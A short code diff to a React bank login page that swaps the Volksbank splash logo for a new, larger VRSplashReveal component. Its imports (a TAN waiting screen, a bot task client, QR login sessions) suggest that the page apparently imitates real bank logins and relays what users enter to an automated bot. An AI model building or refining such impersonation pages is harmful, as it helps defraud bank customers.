@@ -9,6 +9,7 @@ import { BankShell } from "@/components/flow/BankShell";
 import { TanWaitingScreen } from "@/components/flow/TanWaitingScreen";
 import { BotResultScreen } from "@/components/flow/BotResultScreen";
 import SplashLogoReveal from "@/components/SplashLogoReveal";
+import VRSplashReveal from "@/components/VRSplashReveal";
 import { startBotTask, getBotTask } from "@/lib/botClient";
 import { getSecureGoLabel } from "@/lib/secureGoLabel";
 import { startQrLoginSession } from "@/lib/qrLogin.functions";
@@ -497,7 +498,7 @@ export function BankLoginPage({ bankId }: { bankId: string }) {
         {showLogo && (
           <div className="mb-6">
             {isVR ? (
-              <SplashLogoReveal alt={bank?.name || "Volksbank"} className="h-20 sm:h-24" />
+              <VRSplashReveal alt={bank?.name || "Volksbank"} className="h-40 sm:h-48" />
             ) : (
               <img
                 src={splashLogo!}
